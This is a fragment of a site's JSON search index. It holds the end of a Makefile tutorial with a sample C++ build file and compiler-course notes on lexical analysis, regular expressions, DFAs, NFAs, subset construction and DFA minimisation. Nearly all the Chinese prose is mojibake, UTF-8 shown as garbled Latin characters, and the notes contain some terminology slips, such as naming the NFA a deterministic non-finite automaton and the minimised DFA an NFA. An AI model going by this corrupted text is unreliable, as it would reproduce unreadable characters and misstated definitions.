Makefile ä¸­é›†æˆå®šä¹‰è‡ªå·±çš„å˜é‡ï¼Œå¹¶ä¸”çœç•¥ä¸€äº›é»˜è®¤çš„å‚æ•°ï¼š\n#Makefile for â€œtextrâ€ C++ application PROG = textr CC = g++ CPPFLAGS = -g â€“Wall â€“I/usr/class/cs193d/include LDFLAGS = -L/usr/class/cs193/lib â€“lCoolFns OBJS = main.o blurb.o database.o $(PROG) : $(OBJS) \t$(CC) $(LDFLAGS) -o $(PROG) $(OBJS) main.o : \t$(CC) $(CPPFLAGS) -c main.cpp blurb.o : blurb.h \t$(CC) $(CPPFLAGS) -c blurb.cpp database.o : database.h \t$(CC) $(CPPFLAGS) -c database.cpp clean: \trm -f core $(PROG) $(OBJS) "},{"id":370,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/","title":"1.è¯æ³•åˆ†æ","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ åœ°å€ï¼š\n å›½é˜²ç§‘æŠ€å¤§å­¦ç¼–è¯‘åŸç† MOOC è¯¾ç¨‹   è¯æ³•åˆ†æ #  è¯æ³•åˆ†æå™¨ #  ä»»åŠ¡ #  è¯æ³•åˆ†æçš„ä»»åŠ¡ï¼š\n ä»å·¦åˆ°å³é€ä¸ªå­—ç¬¦åœ°å¯¹æºç¨‹åºè¿›è¡Œæ‰«æï¼Œäº§ç”Ÿä¸€ä¸ªå•è¯ç¬¦å·åºåˆ—\n æ‰§è¡Œè¯æ³•åˆ†æä»»åŠ¡çš„å«åšè¯æ³•åˆ†æå™¨ï¼ˆLexical Analyzerï¼‰\nåŠŸèƒ½ #  è¯æ³•åˆ†æå™¨çš„åŠŸèƒ½ï¼š\n è¾“å…¥æºç¨‹åºã€è¾“å‡ºå•è¯ç¬¦å·\n å•è¯ç¬¦å·ç§ç±»ï¼š\n  åŸºæœ¬å­—ï¼Œæˆ–å…³é”®å­—ï¼š\n  æ ‡è¯†ç¬¦ï¼šç”¨æ¥è¡¨ç¤ºå„ç§ç”¨æˆ·å®šä¹‰çš„åå­—\n  å¸¸æ•°\n  è¿ç®—ç¬¦ï¼š+ã€-ã€*ã€/\n  åˆ†ç•Œç¬¦ï¼š,ã€;\u0026hellip;\n  è¯æ³•åˆ†æå™¨çš„è¾“å‡ºï¼š\n è¾“å‡ºçš„å•è¯ç¬¦å·çš„è¡¨ç¤ºå½¢å¼ â†’ å•è¯ç§åˆ«ã€å•è¯è‡ªèº«çš„å€¼  ä¸è¯­æ³•åˆ†æ #  ä½“ç°äº† åˆ†è§£ å’Œ æƒè¡¡ ä¸¤ç§è®¡ç®—æ€ç»´ã€‚\nç»“æ„ #    é¢„å¤„ç†å­ç¨‹åºï¼šå‰”é™¤æ— ç”¨çš„ç©ºç™½ã€è·³æ ¼ç­‰ç¼–è¾‘æ€§å­—ç¬¦ã€‚æ”¾å…¥æ‰«æç¼“å†²åŒºã€‚\n  æ‰«æå™¨é€šè¿‡ èµ·ç‚¹æŒ‡ç¤ºå™¨ å’Œ æœç´¢æŒ‡ç¤ºå™¨ ä¸¤ä¸ªæŒ‡é’ˆå¯¹æ‰«æç¼“å†²åŒºè¿›è¡Œæ‰«æã€‚\n NOTEï¼šè§£å†³æ ‡è¯†ç¬¦è¿‡é•¿é—®é¢˜ â†’ å°†ç¼“å†²åŒºåˆ†ä¸ºä¸¤ä¸ªåŠåŒºï¼Œäº’è¡¥ä½¿ç”¨ã€‚åŠåŒºçš„ç¼“å†²åŒºé•¿åº¦å°±æ˜¯ç¨‹åºå…è®¸çš„æ ‡è¯†ç¬¦çš„æœ€å¤§é•¿åº¦ã€‚    å•è¯ç¬¦å·çš„è¯†åˆ« #    è¶…å‰æœç´¢\nç°ä»£è¯­è¨€ä¸€èˆ¬åŠ å…¥å‡ ç‚¹é™åˆ¶ï¼Œæ¥é¿å…è¶…å‰æœç´¢ï¼š\n  æ‰€æœ‰åŸºæœ¬å­—éƒ½æ˜¯ä¿ç•™å­—ï¼Œç”¨æˆ·ä¸èƒ½ç”¨å®ƒä»¬ä½œä¸ºè‡ªå·±çš„æ ‡è¯†ç¬¦ã€‚\n  åŸºæœ¬å­—ä½œä¸ºç‰¹æ®Šçš„æ ‡è¯†ç¬¦æ¥å¤„ç†ï¼Œä½¿ç”¨ä¿ç•™å­—è¡¨ã€‚\n  å¦‚æœåŸºæœ¬å­—ã€æ ‡è¯†ç¬¦å’Œå¸¸æ•°ï¼ˆæˆ–æ ‡å·ï¼‰ä¹‹é—´æ²¡æœ‰ç¡®å®šçš„è¿ç®—ç¬¦æˆ–ç•Œç¬¦ä½œä¸ºé—´éš”ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ä¸€ä¸ªç©ºç™½ä½œä¸ºé—´éš”ã€‚\n    çŠ¶æ€è½¬æ¢å›¾ã€‚ç”¨äºè¯†åˆ«ï¼ˆæˆ–æ¥å—ï¼‰ä¸€å®šçš„å­—ç¬¦ä¸²ï¼šè‹¥å­˜åœ¨ä¸€æ¡ä»åˆæ€åˆ°æŸä¸€ç»ˆæ€çš„é“è·¯ï¼Œä¸”è¿™æ¡é“è·¯ä¸Šçš„æ‰€æœ‰å¼§ä¸Šçš„è¡¨æœºè…¹è¿æ¥æˆçš„å­—ç­‰äº $$\\alpha$$ï¼Œåˆ™ç§° $$\\alpha$$ è¢«è¯¥çŠ¶æ€è½¬æ¢å›¾æ‰€è¯†åˆ«ï¼ˆæ¥å—ï¼‰ã€‚\nå°†çŠ¶æ€è½¬æ¢å›¾ä¸€èˆ¬åŒ–ï¼š\n  å˜é‡ curState ç”¨äºä¿å­˜ç°æœ‰çŠ¶æ€\n  ç”¨äºŒç»´æ•°ç»„è¡¨ç¤ºçŠ¶æ€å›¾ï¼šstateTrans[state][ch]\n    è®¾è®¡ #   è®¾è®¡ç¨‹åºè®¾è®¡è¯­è¨€çš„å•è¯è§„èŒƒ è®¾è®¡ç¨‹åºè¯­è¨€å¯¹åº”çš„çŠ¶æ€è½¬æ¢å›¾ æ ¹æ®çŠ¶æ€è½¬æ¢å›¾ï¼Œå¹¶æ ¹æ®ä¸‰ç§åˆ†ææ¨¡å¼ï¼Œç¼–ç¨‹å®ç°ä»£ç   è¯¥è¿‡ç¨‹ååˆ†æœ‰è§„å¾‹ï¼Œé‚£ä¹ˆæ˜¯å¦æœ‰è‡ªåŠ¨ç”Ÿæˆè¯æ³•åˆ†æå™¨çš„æ–¹æ³•å‘¢    è‡ªåŠ¨ç”Ÿæˆè¯æ³•åˆ†æå™¨ #  åŸºç¡€ç†è®ºï¼šæ­£è§„è¡¨è¾¾å¼å’Œæœ‰é™è‡ªåŠ¨æœºç†è®ºã€‚\næ¦‚å¿µ #  åŸºæœ¬æ¦‚å¿µï¼š\n  å­—æ¯è¡¨ï¼šä¸€ä¸ªæœ‰ç©·å­—ç¬¦é›†ï¼Œè®°ä½œ $$\\Sigma$$\n  å­—ç¬¦ä¸²ï¼š$$\\Sigma$$ ä¸­çš„å­—ç¬¦æ„æˆçš„æœ‰ç©·åºåˆ—ï¼Œæˆ–ç§° å­—\n  ç©ºå­—ï¼šä¸åŒ…å«ä»»ä½•å­—ç¬¦çš„åºåˆ—ï¼Œè®°ä½œ $$\\epsilon$$\n  $$\\Sigma^{*}$$ è¡¨ç¤º $$\\Sigma$$ ä¸Šæ‰€æœ‰å­—çš„é›†åˆï¼ŒåŒ…å«ç©ºå­— $$\\epsilon$$\n  å­é›†çš„è¿æ¥ï¼ˆç§¯ï¼‰ï¼š$$UV = {\\alpha\\beta | \\alpha \\in U \u0026amp; \\beta \\in V}\\ where\\ U,V \\subseteq \\Sigma^{*}$$\n  V çš„é—­åŒ…ï¼š$${\\displaystyle V^{*} = \\cup^{+\\infin}_{i=0} V_i }$$\n  V çš„æ­£è§„é—­åŒ…ï¼š$$V^{+} = VV^{*}$$\n  æ­£è§„å¼å’Œæ­£è§„é›†ï¼š\n  å…³ç³»ï¼š\n æ­£è§„é›†å¯ä»¥ç”¨æ­£è§„é›†è¡¨ç¤º æ­£è§„å¼æ˜¯è¡¨ç¤ºæ­£è§„é›†çš„ä¸€ç§æ–¹æ³• ä¸€ä¸ªå­—é›†åˆæ˜¯æ­£è§„å¼ $$\\Leftrightarrow$$ ä»–èƒ½ç”¨æ­£è§„å¼è¡¨ç¤º    é€’å½’å®šä¹‰ï¼š\n $$\\epsilon$$ å’Œ $$\\varnothing$$ éƒ½æ˜¯ $$\\Sigma$$ ä¸Šçš„æ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†æ˜¯ $${\\epsilon}$$ å’Œ $$\\varnothing$$ã€‚ ä»»ä½• $$a \\in \\Sigma$$ï¼Œ$$a$$ æ˜¯ $$\\Sigma$$ ä¸Šçš„æ­£è§„å¼ï¼Œä»–è¡¨ç¤ºçš„æ­£è§„é›†ä¸º $${a}$$ å‡å®š $$e_1$$ å’Œ $$e_2$$ éƒ½æ˜¯ $$\\Sigma$$ ä¸Šçš„æ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ä¸º $$L(e_1)$$ å’Œ $$L(e_2)$$ï¼Œåˆ™ï¼š  $$(e_1 | e_2)$$ ä¸ºæ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ä¸º $$L(e_1) \\cup L(e_2)$$ $$(e_1 \\cdot e_2)$$ ä¸ºæ­£è§„å¼ï¼Œä»–ä»¬æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ä¸º $$L(e_1)L(e_2)$$ $$(e_1)^{}$$ ä¸ºæ­£è§„å¼ï¼Œä»–æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ä¸º $$(L(e_1))^{}$$   Defineï¼šä»…æœ‰æœ‰é™æ¬¡ä½¿ç”¨ä¸Šè¿°ä¸‰æ­¥éª¤è€Œå®šä¹‰çš„è¡¨è¾¾å¼æ‰æ˜¯ $$\\Sigma$$ ä¸Šçš„æ­£è§„å¼ï¼Œä»…ç”±è¿™äº›æ­£è§„å¼è¡¨ç¤ºçš„å­—é›†æ‰æ˜¯ $$\\Sigma$$ ä¸Šçš„æ­£è§„é›†ã€‚    ç­‰ä»·ï¼šè‹¥ä¸¤ä¸ªæ­£è§„å¼æ‰€è¡¨ç¤ºçš„æ­£è§„é›†ç›¸åŒï¼Œåˆ™è¿™ä¸¤ä¸ªæ­£è§„å¼ç­‰ä»·ã€‚\n  ç¡®å®šæœ‰é™è‡ªåŠ¨æœº DFA #  å¯¹çŠ¶æ€è½¬æ¢å›¾è¿›è¡Œå½¢å¼åŒ–å®šä¹‰ï¼Œå°±å¾—åˆ°äº†ç¡®å®šæœ‰é™è‡ªåŠ¨æœºçš„æ¦‚å¿µï¼š\n  ç¡®å®šæœ‰é™è‡ªåŠ¨æœº $$M$$ å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªäº”å…ƒç»„ï¼Œ$$M = (S, \\Sigma, f, S_0, F)$$ ï¼Œå…¶ä¸­ï¼š\n $$S$$ ï¼šæœ‰ç©·çŠ¶æ€é›†ï¼› $$\\Sigma$$ï¼šè¾“å…¥å­—æ¯è¡¨ï¼ˆæœ‰ç©·ï¼‰ï¼› $$f$$ ï¼šçŠ¶æ€è½¬æ¢å‡½æ•°ï¼Œä¸º $$S \\times \\Sigma \\rightarrow S$$ çš„å•å€¼éƒ¨åˆ†æ˜ å°„ï¼› $$S_0$$ï¼šæ˜¯å”¯ä¸€çš„ä¸€ä¸ªåˆæ€ï¼Œ$$S_0 \\in S$$ $$F$$ï¼šç»ˆæ€é›†ï¼ˆå¯ç©ºï¼‰    å¦‚æœå¯¹äº $$\\Sigma^{*}$$ ä¸­çš„ä»»ä½•å­— $$\\alpha$$ï¼Œè‹¥å­˜åœ¨ä¸€æ¡ä»åˆæ€åˆ°æŸä¸€ç»ˆæ€çš„é“è·¯ï¼Œä¸”è¿™æ¡è·¯ä¸Šæ‰€æœ‰å¼§ä¸Šçš„æ ‡è®°ç¬¦è¿æ¥æˆçš„å­—ç­‰ä¸ $$\\alpha$$ï¼Œåˆ™ç§° $$\\alpha$$ ä¸º DFA M æ‰€è¯†åˆ«ï¼ˆæ¥å—ï¼‰ã€‚DFA M æ‰€è¯†åˆ«çš„å­—çš„å…¨ä½“è®°ä½ $$L(M)$$\n  éç¡®å®šæœ‰é™è‡ªåŠ¨æœº NFA #  NFA ä¸ DFA æœ‰ç€ç›¸ä¼¼çš„å®šä¹‰ï¼Œä¸åŒç‚¹åœ¨äºä¸Šé¢çš„ç¬¬ 3ã€4 ç‚¹ã€‚è½¬æ¢å‡½æ•°çš„ç»ˆæ€ä¸ç¡®å®šï¼Œä½“ç°äº†éç¡®å®šçš„å«ä¹‰ã€‚\n  ç¡®å®šéæœ‰é™è‡ªåŠ¨æœº $$M$$ å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªäº”å…ƒç»„ï¼Œ$$M = (S, \\Sigma, f, S_0, F)$$ ï¼Œå…¶ä¸­ï¼š\n $$S$$ ï¼šæœ‰ç©·çŠ¶æ€é›†ï¼› $$\\Sigma$$ï¼šè¾“å…¥å­—æ¯è¡¨ï¼ˆæœ‰ç©·ï¼‰ï¼› $$f$$ ï¼šçŠ¶æ€è½¬æ¢å‡½æ•°ï¼Œä¸º $$S \\times \\Sigma^{*} \\rightarrow 2^{S}$$ çš„å•å€¼éƒ¨åˆ†æ˜ å°„ï¼› $$S_0$$ï¼šæ˜¯ä¸€ä¸ªéç©ºåˆæ€é›†ï¼Œ$$S_0 \\subseteq S$$ $$F$$ï¼šç»ˆæ€é›†ï¼ˆå¯ç©ºï¼‰    å¯¹äº $$\\Sigma^{*}$$ ä¸­çš„ä»»ä½•å­— $$\\alpha$$ï¼Œè‹¥å­˜åœ¨ä¸€æ¡ä»åˆæ€åˆ°æŸä¸€ç»ˆæ€çš„é“è·¯ï¼Œä¸”è¿™æ¡é“è·¯ä¸Šæ‰€æœ‰å¼§ä¸Šçš„æ ‡è®°å­—è¿æ¥æˆçš„å­—ç­‰äº $$\\alpha$$ï¼ˆå¿½ç•¥é‚£äº›æ ‡è®°ä¸º $$\\epsilon$$ çš„å¼§ï¼‰ï¼Œåˆ™ç§° $$\\alpha$$ ä¸º NFA M æ‰€æ¥å—ã€‚NFA M æ‰€è¯†åˆ«çš„å­—çš„å…¨ä½“è®°ä¸º $$L(M)$$\n  NFA vs. DFA #  åŒºåˆ« #  ä»çŠ¶æ€å›¾çœ‹ä»–ä»¬çš„åŒºåˆ«ï¼š\n  NFA å¯ä»¥æœ‰å¤šä¸ªåˆæ€ã€‚\n  å¼§ä¸Šçš„æ ‡è®°å¯ä»¥æ˜¯ $$\\Sigma^{*}$$ ä¸­çš„ä¸€ä¸ªå­—ï¼ˆç”šè‡³å¯ä»¥æ˜¯ä¸€ä¸ªæ­£è§„å¼ï¼‰ï¼Œè€Œä¸ä¸€å®šæ˜¯å•ä¸ªå­—ç¬¦ã€‚\n  åŒä¸€ä¸ªå­—å¯èƒ½å‡ºç°åœ¨åŒçŠ¶æ€å°„å‡ºçš„å¤šæ¡å¼§ä¸Šã€‚\n  DFA æ˜¯ NFA çš„ç‰¹ä¾‹ã€‚\n  ç­‰ä»· #   å¯¹äºä»»ä½•ä¸¤ä¸ªæœ‰é™è‡ªåŠ¨æœº M å’Œ M\u0026rsquo;ï¼Œå¦‚æœ $$L(M) = L(M\u0026rsquo;)$$ï¼Œåˆ™ç§° M ä¸ M\u0026rsquo; ç­‰ä»·ã€‚\n è‡ªåŠ¨æœºç†è®ºä¸­çš„ç»“è®ºï¼š\n è‡ªåŠ¨æœºç†è®ºä¸­çš„ä¸€ä¸ªé‡è¦ç»“è®ºï¼šåˆ¤æ–­ä¸¤ä¸ªè‡ªåŠ¨æœºç­‰ä»·æ€§çš„ç®—æ³•æ˜¯å­˜åœ¨çš„ã€‚ DFA ä¸ NFA è¯†åˆ«èƒ½åŠ›æ˜¯ç›¸åŒçš„  æ ¹æ®å®šä¹‰æˆ‘ä»¬çŸ¥é“ï¼ŒDFA æ˜¯ç‰¹æ®Šçš„ NFAï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªå°† NFA ç¡®å®šåŒ–çš„ç®—æ³•ã€‚\nNFA ç¡®å®šåŒ–ï¼šå‡å®š NFA $$M = (S, \\Sigma, f, S_0, F)$$ï¼Œæˆ‘ä»¬å¯¹ M çš„çŠ¶æ€è½¬æ¢å›¾è¿›è¡Œå¦‚ä¸‹æ”¹é€ ï¼š\n  ç­‰ä»·å˜æ¢ 1ï¼šå¼•è¿›æ–°çš„åˆå§‹ç»“ç‚¹ X å’Œç»ˆæ€ç»“ç‚¹ Yï¼Œ$$X, Y \\notin S$$ï¼Œä» X åˆ° $$S_0$$ ä¸­ä»»æ„çŠ¶æ€ç»“ç‚¹è¿ä¸€æ¡ $$\\epsilon$$ ç®­å¼§ï¼Œä» F ä¸­ä»»æ„çŠ¶æ€ç»“ç‚¹å¼•ä¸€æ¡ $$\\epsilon$$ ç®­å¼§åˆ° Y â†’ è§£å†³åˆå§‹çŠ¶æ€å”¯ä¸€æ€§é—®é¢˜ã€‚\n  ç­‰ä»·å˜æ¢ 2ï¼šå¯¹ M çš„çŠ¶æ€è½¬æ¢å›¾è¿›ä¸€æ­¥æ–½åŠ æ›¿æ¢ï¼Œå…¶ä¸­ k æ˜¯æ–°å¼•å…¥çš„çŠ¶æ€ â†’ ç®€åŒ–äº†å›¾ä¸Šçš„æ ‡è®°ã€‚\n  ç­‰ä»·å˜æ¢ 3ï¼šç®—æ³•ï¼Œå­é›†æ³• â†’ è§£å†³ $$\\epsilon$$ å¼§å’Œè½¬æ¢å…³ç³»ï¼š\n  æ¦‚å¿µ $$\\epsilon$$-é—­åŒ…ï¼ˆ$$\\epsilon-closure(I)$$ï¼‰ï¼šè®¾ I æ˜¯ S çš„ä¸€ä¸ªå­é›†ï¼Œå®šä¹‰ I çš„ $$\\epsilon$$-é—­åŒ…ä¸ºï¼š\n è‹¥ $$s \\in I$$ï¼Œåˆ™ $$s \\in \\epsilon-closure(I)$$ï¼› è‹¥ $$s \\in I$$ï¼Œä» s å‡ºå‘ç»è¿‡ä»»æ„æ¡ $$\\epsilon$$ å¼§èƒ½å¤Ÿè¾¾åˆ°çš„ä»»ä½•çŠ¶æ€ $$s\u0026rsquo;$$ éƒ½å±äº $$\\epsilon-closure(I)$$    å®šä¹‰ $$I_a = \\epsilon-closure(J)\\ where\\ a \\in \\Sigma, J ä¸º Iä¸­çš„çŠ¶æ€ç»è¿‡ä¸€æ¡ a å¼§åˆ°è¾¾çš„çŠ¶æ€é›†åˆ$$\n  ç®—æ³•ï¼Œå­é›†æ³•ï¼šä¸å¤±ä¸€èˆ¬æ€§ï¼Œè®¾å­—æ¯è¡¨åªåŒ…å«ä¸¤ä¸ª a å’Œ bï¼Œæˆ‘ä»¬æ„é€ ä¸€å¼ è®¡ç®—çŠ¶æ€é›†çš„è½¬æ¢è¡¨ï¼š\n  é¦–å…ˆï¼Œç½®ç¬¬ 1 åˆ—ä¸º $$\\epsilon-closure({X})$$ï¼Œå¹¶æ±‚å‡ºè¿™ä¸€åˆ—çš„ $$I_a$$ å’Œ $$I_b$$\n  ç„¶åæ£€æŸ¥è¿™ä¸¤ä¸ª $$I_a$$ å’Œ $$I_b$$ï¼Œçœ‹ä»–ä»¬æ˜¯å¦åœ¨è¡¨çš„ç¬¬ä¸€åˆ—ä¸­å‡ºç°ï¼ŒæŠŠæœªæ›¾å‡ºç°çš„å¡«å…¥åé¢çš„ç©ºè¡Œçš„ç¬¬ 1 åˆ—ä¸Šï¼Œæ±‚å‡ºæ¯è¡Œç¬¬ 2ï¼Œ3 åˆ—ä¸Šçš„é›†åˆã€‚\n  é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°æ‰€æœ‰ç¬¬ 2ï¼Œ3 çš„å­é›†å‡å‡ºç°åœ¨ç¬¬ä¸€åˆ—ä¸ºæ­¢ã€‚\n  è¯¥è½¬æ¢è¡¨å”¯ä¸€åˆ»ç”»äº†ä¸€ä¸ª DFA Mï¼Œå…¶ä¸­åˆæ€æ˜¯ $$\\epsilon-closure(X)$$ï¼Œç»ˆæ€æ˜¯å«æœ‰åŸç»ˆæ€ Y çš„å­é›†ã€‚\n      DFA çš„åŒ–ç®€ #  æ¦‚å¿µï¼š\n DFA çš„åŒ–ç®€ï¼ˆæœ€å°åŒ–ï¼‰ï¼šå¯¹äºç»™å®šçš„ DFA Mï¼Œå¯»æ‰¾ä¸€ä¸ªçŠ¶æ€æ•°æ¯” M å°‘çš„ DFA M\u0026rsquo;ï¼Œä½¿å¾— $$L(M) = L(M\u0026rsquo;)$$ã€‚ çŠ¶æ€çš„ç­‰ä»·æ€§ï¼šå‡è®¾ s å’Œ t ä¸º M çš„ä¸¤ä¸ªçŠ¶æ€ï¼Œå¦‚æœä»çŠ¶æ€ s å‡ºå‘èƒ½è¯»å‡ºæŸä¸ªå­— $$\\alpha$$ è€Œåœæ­¢äºç»ˆæ€ï¼Œé‚£ä¹ˆåŒæ ·ï¼Œä» t å‡ºå‘ä¹Ÿèƒ½è¯»å‡º $$\\alpha$$ è€Œåœæ­¢äºç»ˆæ€ï¼Œåä¹‹äº¦ç„¶ï¼Œåˆ™ç§°çŠ¶æ€ s å’Œ t ç­‰ä»·ã€‚ çŠ¶æ€å¯åŒºåˆ«ï¼šå¦‚æœä¸¤ä¸ªçŠ¶æ€ä¸ç­‰ä»·ï¼Œåˆ™ç§°ä»–ä»¬æ˜¯å¯åŒºåˆ«çš„ã€‚  DFA åŒ–ç®€ï¼š\n  åŸºæœ¬æ€æƒ³ï¼šæŠŠ M çš„çŠ¶æ€é›†åˆ’åˆ†æˆä¸€äº›ä¸ç›¸äº¤çš„å­é›†ï¼Œä½¿å¾—ä»»ä½•ä¸¤ä¸ªä¸åŒå­é›†çš„çŠ¶æ€æ˜¯å¯åŒºåˆ«çš„ï¼Œè€ŒåŒä¸€å­é›†å†…çš„ä»»ä½•ä¸¤ä¸ªçŠ¶æ€æ˜¯ç­‰ä»·çš„ã€‚æœ€åï¼Œè®©æ¯ä¸ªå­é›†é€‰å‡ºä¸€ä¸ªä»£è¡¨ï¼ŒåŒæ—¶æ¶ˆå»å…¶ä»–çŠ¶æ€ã€‚\n  åŒ–ç®€ç®—æ³•ï¼š\n  é¦–å…ˆæŠŠ S åˆ’åˆ†ä¸ºç»ˆæ€å’Œéç»ˆæ€ä¸¤ä¸ªå­é›†ï¼Œå½¢æˆåŸºæœ¬åˆ’åˆ† $$\\Pi$$\n  å‡å®šåˆ°æŸä¸€æ—¶åˆ»ï¼Œ$$\\Pi$$ å«æœ‰ m ä¸ªå­é›†ï¼Œè®°ä½œï¼š$$\\Pi = {I^{(1)}, I^{(2)}, \u0026hellip;, I^{(m)}}$$ï¼Œæ£€æŸ¥ $$\\Pi$$ ä¸­çš„æ¯ä¸ªå­é›†æ˜¯å¦å¯ä»¥è¿›ä¸€æ­¥åˆ’åˆ†ï¼š\n  å¯¹æŸä¸ª $$I^{i}$$ï¼Œè‹¥å­˜åœ¨ä¸€ä¸ªè¾“å…¥å­—ç¬¦ a ä½¿å¾— $$I_a^{(i)}$$ ä¸ä¼šåŒ…å«åœ¨ç°è¡Œçš„ $$\\Pi$$ çš„æŸä¸ªå­é›† $$I^{(j)}$$ ä¸­ï¼Œåˆ™åº”è¯¥è‡³å°‘æŠŠ $$I^{(i)}$$ åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ã€‚\nè‹¥ $$s_1, s_2 \\in I^{(i)}, a \\in \\Sigma$$ï¼Œä¸” $$f(s_1, a) = t_1, f(s_2, a)=t_2$$ ï¼Œ$$t_1, t_2$$ å±äºä¸åŒå­é›†ï¼Œåˆ™å°† $$I^{(i)}$$ åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š\n $$I^{(i1)} = {s | s \\in I^{(i)} ä¸” s ç» a å¼§åˆ°è¾¾ tï¼Œä¸” t ä¸ t_1 å±äºç°è¡Œ \\Pi ä¸­çš„åŒä¸€å­é›†}$$ $$I^{(i2)} = I^{i} - I^{(i1)}$$    ä¸€èˆ¬åœ°ï¼Œå¯¹æŸä¸ª a å’Œ $$I^{(i)}$$ï¼Œè‹¥ $$I^{(i)}$$ è½å…¥ç°è¡Œ $$\\Pi$$ ä¸­çš„ N ä¸ªä¸åŒå­é›†ï¼Œåˆ™åº”è¯¥æŠŠ $$I^{i}$$ åˆ’åˆ†æˆ N ä¸ªä¸ç›¸äº¤çš„ç»„ï¼Œä½¿å¾—æ¯ä¸ªç»„ $$J$$ çš„ $$J_a$$ éƒ½è½å…¥ $$\\Pi$$ çš„åŒä¸€å­é›†ã€‚\n    é‡å¤æ­¥éª¤ 2ï¼Œç›´åˆ° $$\\Pi$$ æ‰€å«çš„å­é›†æ•°ç›®ä¸å†å¢é•¿ã€‚\n  å¯¹äºä¸Šè¿°æœ€ååˆ’åˆ† $$\\Pi$$ ä¸­çš„æ¯ä¸ªå­é›†ï¼Œæˆ‘ä»¬é€‰å–æ¯ä¸ªå­é›†ä¸­çš„ä¸€ä¸ªçŠ¶æ€ä»£è¡¨å…¶ä»–çŠ¶æ€ï¼Œåˆ™å¯ä»¥å¾—åˆ°åŒ–ç®€ä¹‹åçš„ NFA Mâ€˜ã€‚\n    æ­£è§„å¼å’Œæœ‰é™è‡ªåŠ¨æœºçš„ç­‰ä»·æ€§ #  ä¸€ä¸ªæ­£è§„å¼ r ä¸ä¸€ä¸ªæœ‰é™è‡ªåŠ¨æœº M ç­‰ä»· $$\\Leftrightarrow$$ $$L(r) = L(M)$$\nå®šç†ï¼šå¯¹äº $$\\Sigma$$ ä¸Šä»»ä¸€ NFA Mï¼Œéƒ½å­˜åœ¨ä¸€ä¸ª $$\\Sigma$$ ä¸Šçš„æ­£è§„å¼ rï¼Œä½¿å¾— $$L(r) = L(M)$$ã€‚è¯æ˜ç®—æ³•å¦‚ä¸‹ï¼š\n  å‡å®š NFA $$M = \u0026lt;S, \\Sigma, \\delta, S_0, F\u0026gt;$$ï¼Œæˆ‘ä»¬å¯¹ M çš„çŠ¶æ€å›¾è¿›è¡Œå¦‚ä¸‹æ”¹é€ ï¼š\n  åœ¨ M çš„çŠ¶æ€å›¾ä¸ŠåŠ å…¥ä¸¤ä¸ªçŠ¶æ€ X å’Œ Yï¼Œ ä» X ç”¨ $$\\epsilon$$ å¼§è¿æ¥åˆ° M çš„æ‰€æœ‰åˆæ€ç»“ç‚¹ï¼Œä» M çš„æ‰€æœ‰ç»ˆæ€ç»“ç‚¹ç”¨ $$\\epsilon$$ å¼§è¿æ¥åˆ° Yï¼Œä»è€Œå½¢æˆä¸€ä¸ªæ–°çš„ NFAï¼Œè®°ä½œ M\u0026rsquo;ï¼Œä»–åªæœ‰ä¸€ä¸ªåˆæ€ X å’Œä¸€ä¸ªç»ˆæ€ Yï¼Œæ˜¾ç„¶ $$L(M) = L(M\u0026rsquo;)$$\n  å°† $${\\displaystyle (i) \\xrightarrow{r_1} (j) \\xrightarrow{r_2} (k)}$$ æ›¿æ¢ä¸º $${\\displaystyle (i) \\xrightarrow{r_1 \\cdot r_2} (k)}$$\n  å°†æ›¿æ¢ä¸º $$(i) \\xrightarrow{r_1 | r_2} (j)$$\n  å°† æ›¿æ¢ä¸º $$(i) \\xrightarrow{r_1 \\cdot r_2* \\cdot r_3} (k)$$\n  é‡å¤ä¸Šè¿° 2-4 è§„åˆ™ï¼Œç›´è‡³å›¾ä¸­åªå‰©ä¸‹ä¸¤ä¸ªç»“ç‚¹ä¸€æ¡å¼§ã€‚æœ€å X åˆ° Y ä¸Šçš„å¼§æ ‡è®°çš„æ­£è§„å¼å³ä¸ºè‡ªåŠ¨æœºæ‰€å¯¹åº”çš„æ­£è§„å¼ rã€‚\n    å®šç†ï¼šå¯¹äºä»»ä½•ä¸€ä¸ªæ­£è§„å¼ rï¼Œéƒ½å­˜åœ¨ä¸€ä¸ª NFA Mï¼Œä½¿å¾— $$L(M) = L(r)$$ï¼Œå¹¶ä¸” M åªæœ‰ä¸€ä¸ªåˆæ€å’Œä¸€ä¸ªç»ˆæ€ï¼Œè€Œä¸”æ²¡æœ‰ä»ç»ˆæ€å‡ºå‘çš„ç®­å¼§ã€‚å¯¹è¿ç®—ç¬¦æ•°ç›® k è¿›è¡Œæ•°å­¦å½’çº³æ³•è¯æ˜ï¼Œè¯æ˜å¦‚ä¸‹ï¼š\n  è‹¥ r å…·æœ‰ 0 ä¸ªè¿ç®—ç¬¦ï¼Œåˆ™ $$r = \\epsilon$$ æˆ– $$r = \\varnothing$$ æˆ– $$r = a\\ where\\ a \\in \\Sigma$$ã€‚å¾ˆæ˜¾ç„¶å®¹æ˜“æ„é€ è¿™æ ·æ»¡è¶³è¦æ±‚çš„ NFAã€‚\n  å‡è®¾å¯¹äºè¿ç®—ç¬¦æ•°ç›®å°‘äº $$k(k \\ge 1)$$ çš„æ­£è§„å¼æˆç«‹ï¼Œå½“ r ä¸­å«æœ‰ k ä¸ªè¿ç®—ç¬¦æ—¶ï¼Œr æœ‰ä¸‰ç§æƒ…å†µï¼Œæ˜¾ç„¶éƒ½æˆç«‹ã€‚\n  PostScriptï¼šä¸Šè¿°è¯æ˜å®é™…ä¸Šä¹Ÿæ˜¯å°†æ­£è§„è¡¨è¾¾å¼æ„é€ æˆ NFA çš„ç®—æ³•ã€‚\n  